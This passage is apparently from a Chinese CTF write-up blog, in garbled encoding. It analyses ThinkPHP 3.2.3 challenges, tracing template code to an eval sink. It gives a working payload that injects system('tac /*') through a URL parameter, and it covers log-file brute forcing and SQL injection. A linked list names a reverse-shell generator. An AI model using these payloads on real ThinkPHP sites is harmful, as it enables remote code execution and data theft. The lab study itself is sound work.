    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">view</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>å¾€ä¸‹çœ‹è°ƒç”¨çš„displayæ–¹æ³•</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">display</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">G</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'viewStartTime'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// è§†å›¾å¼€å§‹æ ‡ç­¾</span>
    <span class="token class-name static-context">Hook</span><span class="token operator">::</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'view_begin'</span><span class="token punctuation">,</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// è§£æå¹¶è·å–æ¨¡æ¿å†…å®¹</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// è¾“å‡ºæ¨¡æ¿å†…å®¹</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token variable">$charset</span><span class="token punctuation">,</span><span class="token variable">$contentType</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// è§†å›¾ç»“æŸæ ‡ç­¾</span>
    <span class="token class-name static-context">Hook</span><span class="token operator">::</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'view_end'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">fetch</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$prefix</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$templateFile</span>   <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">parseTemplate</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// æ¨¡æ¿æ–‡ä»¶ä¸å­˜åœ¨ç›´æ¥è¿”å›</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">E</span><span class="token punctuation">(</span><span class="token function">L</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_TEMPLATE_NOT_EXIST_'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">':'</span><span class="token operator">.</span><span class="token variable">$templateFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token function">defined</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'THEME_PATH'</span><span class="token punctuation">)</span> <span class="token keyword">or</span>    <span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'THEME_PATH'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getThemePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// é¡µé¢ç¼“å­˜</span>
    <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">ob_implicit_flush</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'TMPL_ENGINE_TYPE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// ä½¿ç”¨PHPåŸç”Ÿæ¨¡æ¿</span>
        <span class="token variable">$_content</span>   <span class="token operator">=</span>   <span class="token variable">$content</span><span class="token punctuation">;</span>
        <span class="token comment">// æ¨¡æ¿é˜µåˆ—å˜é‡åˆ†è§£æˆä¸ºç‹¬ç«‹å˜é‡</span>
        <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tVar</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// ç›´æ¥è½½å…¥PHPæ¨¡æ¿</span>
        <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_content</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token keyword">include</span> <span class="token variable">$templateFile</span><span class="token punctuation">:</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?>'</span><span class="token operator">.</span><span class="token variable">$_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token comment">// è§†å›¾è§£ææ ‡ç­¾</span>
        <span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'var'</span><span class="token operator">=></span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tVar</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token operator">=></span><span class="token variable">$templateFile</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'content'</span><span class="token operator">=></span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'prefix'</span><span class="token operator">=></span><span class="token variable">$prefix</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name static-context">Hook</span><span class="token operator">::</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'view_parse'</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// è·å–å¹¶æ¸…ç©ºç¼“å­˜</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">ob_get_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// å†…å®¹è¿‡æ»¤æ ‡ç­¾</span>
    <span class="token class-name static-context">Hook</span><span class="token operator">::</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'view_filter'</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// è¾“å‡ºæ¨¡æ¿æ–‡ä»¶</span>
    <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨<code>TMPL_ENGINE_TYPE==&#39;php&#39;</code>æ—¶ï¼Œå…³é”®å°±åœ¨è¿™å¥è¯äº†<code>include $templateFile:eval(&#39;?&gt;&#39;.$_content);</code>æ­¤å¤„çš„<code>$_content</code>æˆ‘ä»¬æ˜¯å®Œå…¨å¯æ§çš„ï¼Œä¹Ÿå°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤</p>
<p>è€Œå½“<code>TMPL_ENGINE_TYPE!=&#39;php&#39;</code>æ—¶ï¼Œæ‰§è¡Œçš„Hookä¸­çš„listenæ–¹æ³•ï¼Œç„¶åæ‰§è¡Œexecæ–¹æ³•ï¼Œç„¶årunæ–¹æ³•ï¼Œæœ€ååŠ è½½å¹¶åŒ…å«ä¸€ä¸ªç¼“å­˜æ–‡ä»¶</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">static</span> <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">listen</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$params</span><span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$tags</span><span class="token punctuation">[</span><span class="token variable">$tag</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">'Start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">trace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[ '</span><span class="token operator">.</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">' ] --START--'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'INFO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$tags</span><span class="token punctuation">[</span><span class="token variable">$tag</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token constant">APP_DEBUG</span> <span class="token operator">&amp;&amp;</span> <span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'_start'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$result</span> <span class="token operator">=</span>   <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$tag</span><span class="token punctuation">,</span><span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'_end'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">trace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Run '</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">' [ RunTime:'</span><span class="token operator">.</span><span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'_start'</span><span class="token punctuation">,</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'_end'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'s ]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'INFO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// å¦‚æœè¿”å›false åˆ™ä¸­æ–­æ’ä»¶æ‰§è¡Œ</span>
                <span class="token keyword">return</span> <span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// è®°å½•è¡Œä¸ºçš„æ‰§è¡Œæ—¥å¿—</span>
            <span class="token function">trace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[ '</span><span class="token operator">.</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">' ] --END-- [ RunTime:'</span><span class="token operator">.</span><span class="token function">G</span><span class="token punctuation">(</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">'Start'</span><span class="token punctuation">,</span><span class="token variable">$tag</span><span class="token operator">.</span><span class="token string single-quoted-string">'End'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'s ]'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'INFO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">public function load($_filename,$vars&#x3D;null)&#123;
    if(!is_null($vars))
        extract($vars, EXTR_OVERWRITE);
    eval(&#39;?&gt;&#39;.$this-&gt;read($_filename));
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>















<p>æœ€ç»ˆpayload</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php&#x2F;Home&#x2F;Index&#x2F;index?n&#x3D;&lt;?php%20system(%27tac%20&#x2F;*%27);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>572</strong></p>
<p>ThinkPHPæ—¥å¿—æ–‡ä»¶</p>
<p>é¢˜ç›®ä¸­æåˆ°äº†çˆ†ç ´ï¼Œåœ¨thinkphpå¼€å¯debugçš„æƒ…å†µä¸‹ä¼šåœ¨Runtimeç›®å½•ä¸‹ç”Ÿæˆlogæ–‡ä»¶ï¼Œæ–‡ä»¶çš„åç§°æ˜¯ä»¥<code>å¹´_æœˆ_æ—¥.log</code>æ¥å‘½åçš„ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ¥çˆ†ç ´æ–‡ä»¶å</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;xx_xx_xx.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206131917820.png"></p>
<p>æ‰«å‡ºäº†è¿™ä¹ˆä¸ªæ–‡ä»¶ï¼Œå‘ç°ä¼¼ä¹ä¼ å‚showctfå¯æ‰§è¡Œphpä»£ç ï¼Œæ‹¿åˆ°flag</p>
<p><strong>573</strong></p>
<p><strong>ThinkPHP 3.2.3sqlæ³¨å…¥æ¼æ´</strong></p>
<p>å…ˆå†™ä¸ªå¯ä»¥è°ƒç”¨å†…ç½®sqlæŸ¥è¯¢çš„ä¸»é¡µ</p>
<pre class="line-numbers language-none"><code class="language-none">class IndexController extends Controller &#123;
    public function index()&#123;
    $a&#x3D;M(&#39;xxx&#39;);  &#x2F;&#x2F;è¡¨å
    $id&#x3D;I(&#39;GET.id&#39;);
    $b&#x3D;$a-&gt;find($id);
    var_dump($b);
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨Iæ–¹æ³•ä¸­å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œé»˜è®¤è¿‡æ»¤å™¨<code>DEFAULT_FILTER</code>æ˜¯ä¸ä¼šå¯¹å•å¼•å·åšè¿‡æ»¤æ“ä½œçš„ï¼Œæ‰€ä»¥æ­¤å¤„ä¸ç”¨ç®¡ï¼Œä¸‹é¢èµ°<code>think_filter</code>æ–¹æ³•ï¼Œè¿™é‡Œå¯¹ä¸€äº›æ•æ„Ÿå®‰å…¨å†…å®¹è¿›è¡Œäº†è¿‡æ»¤</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">think_filter</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token comment">// TODO å…¶ä»–å®‰å…¨è¿‡æ»¤</span>
	<span class="token comment">// è¿‡æ»¤æŸ¥è¯¢ç‰¹æ®Šå­—ç¬¦</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$value</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>OKï¼Œè¾“å…¥æ£€æŸ¥å®Œæ¯•ï¼Œæˆ‘ä»¬è¾“å…¥çš„å†…å®¹è¿›å…¥åˆ°<code>find</code>æ–¹æ³•ä¸­ï¼Œè¿™é‡Œçš„æ³¨é‡Šä¹Ÿå¯¹æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°åšäº†è¯¦ç»†çš„è§£é‡Šï¼Œä¸‹ä¸€æ­¥è¿›ä¸€æ­¥è·Ÿè¸ª<code>_parseOptions</code>æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¸ª<code>_parseType</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å¯¹å†…å®¹ç±»å‹è¿›è¡Œè§£æ</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**
 * æŸ¥è¯¢æ•°æ®
 * @access public
 * @param mixed $options è¡¨è¾¾å¼å‚æ•°
 * @return mixed
 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">if(is_scalar($val)) &#123;
    $this-&gt;_parseType($options[&#39;where&#39;],$key);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">elseif(false &#x3D;&#x3D;&#x3D; strpos($fieldType,&#39;bigint&#39;) &amp;&amp; false !&#x3D;&#x3D; strpos($fieldType,&#39;int&#39;)) &#123;
                $data[$key]   &#x3D;  intval($data[$key]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>





<p>å…ˆæ”¾ä¸€ä¸ªyuå¸ˆå‚…çš„<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/119424071" >ä»£ç å®¡è®¡</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>ï¼Œä»¥åå†å›æ¥çœ‹</p>
<p><strong>574</strong></p>
<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/f85e0a9a.html">å¤§ä½¬æ–‡ç« åˆé›†</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-06-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-10-08</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/f85e0a9a.html" data-flag-title="å¤§ä½¬æ–‡ç« åˆé›†"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h3 id="CTF-PHPååºåˆ—åŒ–æ€»ç»“"   >
          <a href="#CTF-PHPååºåˆ—åŒ–æ€»ç»“" class="heading-link"><i class="fas fa-link"></i></a><a href="#CTF-PHPååºåˆ—åŒ–æ€»ç»“" class="headerlink" title="[CTF]PHPååºåˆ—åŒ–æ€»ç»“"></a><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/113588692?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen" >[CTF]PHPååºåˆ—åŒ–æ€»ç»“</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h3>
      
        <h3 id="CTF-htaccessçš„ä½¿ç”¨æŠ€å·§æ€»ç»“"   >
          <a href="#CTF-htaccessçš„ä½¿ç”¨æŠ€å·§æ€»ç»“" class="heading-link"><i class="fas fa-link"></i></a><a href="#CTF-htaccessçš„ä½¿ç”¨æŠ€å·§æ€»ç»“" class="headerlink" title="[CTF].htaccessçš„ä½¿ç”¨æŠ€å·§æ€»ç»“"></a><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/116666720" >[CTF].htaccessçš„ä½¿ç”¨æŠ€å·§æ€»ç»“</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h3>
      
        <h3 id="Webå®‰å…¨å­¦ä¹ ç¬”è®°"   >
          <a href="#Webå®‰å…¨å­¦ä¹ ç¬”è®°" class="heading-link"><i class="fas fa-link"></i></a><a href="#Webå®‰å…¨å­¦ä¹ ç¬”è®°" class="headerlink" title="Webå®‰å…¨å­¦ä¹ ç¬”è®°"></a><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/index.html" >Webå®‰å…¨å­¦ä¹ ç¬”è®°</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h3>
      
        <h3 id="Java-Webå®‰å…¨"   >
          <a href="#Java-Webå®‰å…¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#Java-Webå®‰å…¨" class="headerlink" title="Java Webå®‰å…¨"></a><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://javasec.org/" >Java Webå®‰å…¨</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h3>
      
        <h3 id="åå¼¹shellå‘½ä»¤ç”Ÿæˆå™¨"   >
          <a href="#åå¼¹shellå‘½ä»¤ç”Ÿæˆå™¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#åå¼¹shellå‘½ä»¤ç”Ÿæˆå™¨" class="headerlink" title="åå¼¹shellå‘½ä»¤ç”Ÿæˆå™¨"></a><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.revshells.com/" >åå¼¹shellå‘½ä»¤ç”Ÿæˆå™¨</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h3>
      
        <h3 id="PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶"   >
          <a href="#PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶" class="headerlink" title="PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶"></a><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" >PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h3>
      
        <h3 id="Java-Webå…¥é—¨"   >
          <a href="#Java-Webå…¥é—¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#Java-Webå…¥é—¨" class="headerlink" title="Java Webå…¥é—¨"></a><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.bookstack.cn/read/Heart-First-JavaWeb/source-README.md" >Java Webå…¥é—¨</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h3>
      
        <h3 id="ä»ä¸€ä¸ªç»•è¿‡é•¿åº¦é™åˆ¶çš„-XSS-ä¸­ï¼Œæˆ‘ä»¬èƒ½å­¦åˆ°ä»€ä¹ˆï¼Ÿ"   >
          <a href="#ä»ä¸€ä¸ªç»•è¿‡é•¿åº¦é™åˆ¶çš„-XSS-ä¸­ï¼Œæˆ‘ä»¬èƒ½å­¦åˆ°ä»€ä¹ˆï¼Ÿ" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä»ä¸€ä¸ªç»•è¿‡é•¿åº¦é™åˆ¶çš„-XSS-ä¸­ï¼Œæˆ‘ä»¬èƒ½å­¦åˆ°ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä»ä¸€ä¸ªç»•è¿‡é•¿åº¦é™åˆ¶çš„ XSS ä¸­ï¼Œæˆ‘ä»¬èƒ½å­¦åˆ°ä»€ä¹ˆï¼Ÿ"></a><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.tr0y.wang/2020/08/18/IDN/" >ä»ä¸€ä¸ªç»•è¿‡é•¿åº¦é™åˆ¶çš„ XSS ä¸­ï¼Œæˆ‘ä»¬èƒ½å­¦åˆ°ä»€ä¹ˆï¼Ÿ</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h3>
      <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/76fe6b8e.html">CTFshowå¤§èµ›åŸé¢˜</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-06-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span 